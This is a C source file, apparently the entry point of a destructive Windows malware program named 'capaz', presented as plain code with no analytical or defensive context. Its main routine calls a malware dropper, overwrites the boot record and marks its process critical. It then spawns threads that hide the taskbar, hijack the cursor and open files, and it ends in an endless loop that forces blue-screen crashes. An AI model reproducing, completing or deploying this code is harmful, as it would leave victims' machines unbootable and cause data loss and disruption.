#include "capaz.h"

BOOL
WINAPI
InitializeCapaz(
	VOID
)
{
	SeedXorshift32( ( DWORD )__rdtsc( ) );
	SetPriorityClass( GetCurrentProcess( ), REALTIME_PRIORITY_CLASS );
	return TRUE;
}

INT
WINAPI
wWinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     WCHAR*    szCmdLine,
	_In_     INT       nShowCmd
)
{
	UNREFERENCED_PARAMETER( hInstance );
	UNREFERENCED_PARAMETER( hPrevInstance );
	UNREFERENCED_PARAMETER( szCmdLine );
	UNREFERENCED_PARAMETER( nShowCmd );

	InitializeCapaz( );

	if ( !ExecuteMalwareDropper( ) )
	{
		return 0;
	}

	if ( !OverwriteBoot( ) )
	{
		return 0;
	}

	if ( !SetProcessCritical( ) )
	{
		return 0;
	}

	CreateMutexW( NULL, TRUE, L"capaz.exe" );

	if ( GetLastError( ) == ERROR_ALREADY_EXISTS )
	{
		BlueScreen( );
		return 0;
	}

	Sleep( 30000 );
	CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )EnumThreadText, NULL, 0, NULL );
	Sleep( 30000 );

	CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )NoTaskbar, NULL, 0, NULL );
	Sleep( 30000 );

	CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )CursorMove, NULL, 0, NULL );
	Sleep( 30000 );
	CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )CursorClick, NULL, 0, NULL );
	Sleep( 30000 );

	CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )EnumThreadWnd, NULL, 0, NULL );
	Sleep( 30000 );
	CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )FileOpener, NULL, 0, NULL );
	Sleep( 30000 );

	for ( ;; )
	{
		BlueScreen( );
	}
}